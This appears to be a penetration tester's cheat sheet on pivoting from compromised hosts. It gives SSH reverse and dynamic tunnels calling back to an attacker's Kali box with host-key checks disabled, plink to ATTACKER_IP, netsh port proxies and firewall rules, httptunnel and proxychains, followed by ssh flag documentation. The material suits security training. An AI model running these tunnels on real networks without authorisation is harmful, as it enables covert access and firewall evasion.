#### Linux Firewall check
```
 /etc/iptables
```
#### Windows Firewall check
```
netsh advfirewall show currentprofile
```

#### Reverse Tunnel
On compromised host, forward port 22 on $IP to port 1122 and forward 3306 on $IP to port 13306

##### kill prior tunnels using ports
```
sudo netstat -tulpn
kill PID
```
```
ssh -f -N -R 1122:$IP:22 -R 13306:$IP:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/tmp/keys/id_rsa kali@$myIP
```

#### Reverse Dynamic Port Forward
```
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@$myIP
```




#### Local tunnel
```
# Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
# Scenario: access a host that's being blocked by a firewall via SSH_SERVER;
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@ownedIP
```


#### SSH dynamic tunnel
```
# Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER
# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;
ssh -D 127.0.0.1:8080 user@ownedIP
sudo ssh -N -D 127.0.0.1:8130 user@ownedIP
ssh -N -D 127.0.0.1:8130 user@ownedIP -oKexAlgorithms=+diffie-hellman-group1-sha1 -vv -p 8888
```

#### SSH Remmote tunnel
```
# Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389
# Scenario: expose RDP on non-routable network;
ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP
```
#### Proxy tunnel
```
# Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128
# Scenario: a remote host has SSH running, but it's only bound to 127.0.0.1, but you want to reach it;
proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555
ssh user@127.0.0.1 -p 5555
```

#### Tunnel to specific service port on compromised box
```
ssh -N -L 0.0.0.0:PORT:127.0.0.1:ServicePort user@$(cat ip)
```
#### Remote port forwarding
```
C:\plink.exe -ssh -l kali -pw PASSWORD -R 192.168.119.166:1234:127.0.0.1:3306 192.168.119.166
```

#### local port forwarding
```
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=192.168.166.10 connectport=445 connectaddress=172.16.166.5

netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip 192.168.166.10 localport=4455 action=allow
```
#### SSH over HTTP

```bash
### compromised host
ssh -L 0.0.0.0:8888:TARGET:PORT user@127.0.0.1
hts --forward-port localhost:8888 1234
### attack box
htc --forward-port 8080 compromised:1234
rdesktop 127.0.0.:8080
```


# Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22
```
hts -F localhost:22 80
```
# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80
```
htc -F 8080 192.168.1.15:80
```
# Client - connect to localhost:8080 -> get tunneled to 192.168.1.15:80 -> get redirected to 192.168.1.15:22
```
ssh localhost -p 8080
```


direct tools to use proxy with **ProxyChains**

```
/etc/proxychains4.conf
socks4     127.0.0.1 8130
```

**To run through our SOCKS4 proxy prepend each command with proxychains**

```
sudo vim /etc/proxychains4.conf
sudo proxychains4 nmap -S -sT -Pn -e tun0
```

- ProxyChains will attempt to read its configuration file first from the current directory
- then from $(HOME)/.proxychainsdirectory
- and then from /etc/proxychains4.conf
- This allows tools through multiple dynamic tunnels


#### Flags for SSH
```
-R [bind_address:]port:host:hostport
-R [bind_address:]port:local_socket
-R remote_socket:host:hostport
-R remote_socket:local_socket
-R [bind_address:]port
```
Specifies that connections to the given TCP port or Unix socket on the remote (server) host are to be forwarded to the local side. 

This works by allocating a socket to listen to either a TCP port or to a Unix socket on the remote side. Whenever a connection is made to this port or Unix socket, the connection is forwarded over the secure channel, and a connection is made from the local machine to either an explicit destination specified by host port hostport, or local_socket, or, if no explicit destination was specified, ssh will act as a SOCKS 4/5 proxy and forward connections to the destinations requested by the remote SOCKS client.

```
-L [bind_address:]port:host:hostport
-L [bind_address:]port:remote_socket
-L local_socket:host:hostport
-L local_socket:remote_socket
```
Specifies that connections to the given TCP port or Unix socket on the local (client) host are to be forwarded to the given host and port, or Unix socket, on the remote side. 

This works by allocating a socket to listen to either a TCP port on the local side, optionally bound to the specified bind_address, or to a Unix socket. Whenever a connection is made to the local port or socket, the connection is forwarded over the secure channel, and a connection is made to either host port hostport, or the Unix socket remote_socket, from the remote machine

Port forwardings can also be specified in the configuration file. Only the superuser can forward privileged ports. IPv6 addresses can be specified by enclosing the address in square brackets.
By default, the local port is bound in accordance with the GatewayPorts setting. However, an explicit bind_address may be used to bind the connection to a specific address. The bind_address of "localhost" indicates that the listening port be bound for local use only, while an empty address or '*' indicates that the port should be available from all interfaces


```
-f 
```
Requests ssh to go to background just before command execution. This is useful if ssh is going to ask for passwords or passphrases, but the user wants it in the background. This implies -n. The recommended way to start X11 programs at a remote site is with something like ssh -f host xterm

```
-N 
```
Do not execute a remote command. This is useful for just forwarding ports.

```
-D [bind_address:]port
```
Specifies a local "dynamic" application-level port forwarding. This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address. Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server. Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file.



